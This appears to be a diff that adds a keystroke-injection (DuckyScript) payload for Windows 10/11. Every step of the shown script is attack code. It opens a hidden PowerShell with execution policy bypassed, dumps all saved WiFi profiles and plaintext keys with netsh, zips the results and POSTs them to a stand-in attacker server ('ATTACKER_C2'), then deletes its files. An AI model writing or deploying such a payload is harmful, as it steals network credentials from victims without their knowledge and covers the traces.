@@ -1,0 +1,87 @@
+REM ==========================================
+REM Title: WiFi Profile & Key Capture
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Exports all saved WiFi
+REM   profiles with plaintext passwords and
+REM   network keys. Compiles results into a
+REM   formatted report and exfiltrates via
+REM   HTTP POST to attacker server.
+REM Category: Credential Access / Collection
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Set output path and exfil URL
+STRING $outFile = "$env:TEMP\wifi_report_$(Get-Date -Format 'yyyyMMdd_HHmm').txt"
+ENTER
+DELAY 350
+STRING $exfilUrl = 'https://ATTACKER_C2/collect'
+ENTER
+DELAY 350
+REM Gather system identification info
+STRING $header = "=== WiFi Profile Dump ===" + "`n"
+ENTER
+DELAY 350
+STRING $header += "Hostname: $env:COMPUTERNAME`nUser: $env:USERNAME`nDate: $(Get-Date)`n"
+ENTER
+DELAY 350
+STRING $header += "=" * 40 + "`n"
+ENTER
+DELAY 350
+STRING $header | Out-File $outFile -Force
+ENTER
+DELAY 400
+REM Get all WiFi profile names
+STRING $profiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }
+ENTER
+DELAY 500
+REM Extract each profile with key content
+STRING foreach ($p in $profiles) {
+ENTER
+DELAY 300
+STRING   $detail = netsh wlan show profile name="$p" key=clear
+ENTER
+DELAY 300
+STRING   $ssid = ($detail | Select-String 'SSID name').ToString().Split(':')[1].Trim()
+ENTER
+DELAY 300
+STRING   $auth = ($detail | Select-String 'Authentication').ToString().Split(':')[1].Trim()
+ENTER
+DELAY 300
+STRING   $key = ($detail | Select-String 'Key Content')
+ENTER
+DELAY 300
+STRING   if ($key) { $keyVal = $key.ToString().Split(':')[1].Trim() } else { $keyVal = 'N/A (Open)' }
+ENTER
+DELAY 300
+STRING   "SSID: $ssid | Auth: $auth | Key: $keyVal" | Out-File $outFile -Append
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 500
+REM Also export raw XML profiles for full detail
+STRING $xmlDir = "$env:TEMP\wifi_xml"; New-Item -ItemType Directory -Path $xmlDir -Force | Out-Null
+ENTER
+DELAY 350
+STRING netsh wlan export profile key=clear folder="$xmlDir" | Out-Null
+ENTER
+DELAY 500
+REM Compress everything for exfil
+STRING Compress-Archive -Path $outFile,$xmlDir -DestinationPath "$env:TEMP\wifi_dump.zip" -Force
+ENTER
+DELAY 400
+REM Exfiltrate
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile "$env:TEMP\wifi_dump.zip" -ContentType 'application/octet-stream' } catch {}
+ENTER
+DELAY 500
+REM Cleanup
+STRING Remove-Item $outFile,$xmlDir,"$env:TEMP\wifi_dump.zip" -Recurse -Force 2>$null
+ENTER
+DELAY 350
+STRING exit
+ENTER
